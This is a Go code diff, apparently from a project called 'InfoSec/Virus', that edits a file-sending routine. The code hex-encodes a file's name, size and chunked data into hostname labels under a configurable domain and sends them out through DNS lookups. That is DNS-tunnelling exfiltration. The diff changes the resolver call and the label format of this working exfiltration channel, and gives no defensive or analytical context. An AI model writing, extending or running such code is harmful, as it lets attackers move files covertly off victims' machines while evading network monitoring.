@@ -11,10 +11,8 @@ import (
 	"InfoSec/Virus/Scanner"
 	"strconv"
 	"InfoSec/Params"
-	"context"
 	"hash/crc64"
 )
-
 
 // WG is wait group to synchronize the pool and the main routine
 var Wg sync.WaitGroup
@@ -50,6 +48,7 @@ func SendFile(path string) error {
 	filename = hex.EncodeToString([]byte(filename))
 	size = hex.EncodeToString([]byte(size))
 	filename = fmt.Sprintf("%s.%s", filename, size)
+
 	resolve(filename, prefix, 0)
 
 	for i := int64(1);; {
@@ -67,13 +66,9 @@ func SendFile(path string) error {
 
 // resolve: forms host and resolves it
 func resolve(content string, prefix uint64, offset int64) {
-	Resolver := &net.Resolver{
-		PreferGo: Params.PreferGoResolver,
-		StrictErrors: true,
-	}
-	host := fmt.Sprintf("%016x.%019x.%s.%s", prefix, offset, content, Params.URL)
-	fmt.Printf("2017-11-12 14:22:41 %s.\n", host)
-	_, err := Resolver.LookupHost(context.Background(), host)
+	host := fmt.Sprintf("%016x.%016x.%s.%s", prefix, offset, content, Params.URL)
+	//fmt.Printf("2017-11-12 14:22:41 %s.\n", host)
+	_, err := net.LookupHost(host)
 	if err != nil {
 		log.Println(err)
 	}
